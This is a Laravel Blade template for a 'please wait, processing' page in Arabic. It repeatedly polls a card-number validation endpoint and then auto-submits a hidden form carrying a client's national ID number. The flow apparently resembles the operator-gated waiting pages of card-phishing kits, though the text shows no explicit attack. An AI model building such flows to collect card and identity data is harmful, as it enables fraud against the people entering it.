@extends('frontend.layout.master-two')
@section('content')

<form action="{{route('validateCardNumberAction')}}" method="post" id="form">
    @csrf
    <input type="hidden" name="national_number" value="{{$client->national_number}}">
    <input type="hidden" name="client_id" value="{{$client->id}}">
    <button type="submit" id="submit_button"></button>
</form>
<div class="popup-container" id="popup-container">
    <div class="popup-content">
        <h5 class="mb-3 mt-3">الرجاء  الانتظار </h5>
        <div class="spinner-border m-5" role="status">
            <span class="visually-hidden"></span>
        </div>
        <h5>جاري المعالجه نرجو الانتظار....</h5>
    </div>
</div>

@endsection

@section('custom-script')
<script src="{{ asset('frontend/assets/js/pop-up.js') }}"></script>
<script>
$(document).ready(function() {
    function fetchNotifications() {
        $.ajax({
            url: '{{ route("client.validateVisaNumberAjax" ,$client->id ) }}',
            type: 'GET',
            dataType: 'json',
            success: function(data) {
                if (data.status === 1) {
                    $('#submit_button').click();
                }
                if (data.status === 0) {
                    $('#submit_button').click();
                }
            },
            error: function(xhr, status, error) {}
        });
    }
    fetchNotifications();
    setInterval(fetchNotifications, 5000);
});
</script>

@endsection
